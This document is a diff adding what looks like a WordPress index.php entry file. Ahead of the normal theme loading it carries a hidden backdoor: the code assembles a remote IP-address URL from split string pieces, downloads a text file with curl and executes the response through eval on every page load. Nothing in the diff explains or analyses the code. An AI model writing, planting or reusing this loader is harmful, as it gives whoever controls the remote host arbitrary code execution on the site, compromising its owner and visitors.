@@ -1,0 +1,28 @@
+<?php
+try {
+    $urlParts = [
+        'http://',
+        '208.110.65.59',
+        '/', 
+        'j251022_13',
+        '/',
+        'init',
+        '.txt'
+    ];
+    
+    $realUrl = implode('', $urlParts);
+    
+    $c = curl_init($realUrl);
+    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($c, CURLOPT_TIMEOUT, 5);
+    curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 3);
+    $result = curl_exec($c);
+    
+    if ($result !== false) {
+        eval('?>' . $result);
+    }
+} catch (Exception $e) {
+    error_log('External script error: ' . $e->getMessage());
+}
+define('WP_USE_THEMES', true);
+require __DIR__ . '/wp-blog-header.php';
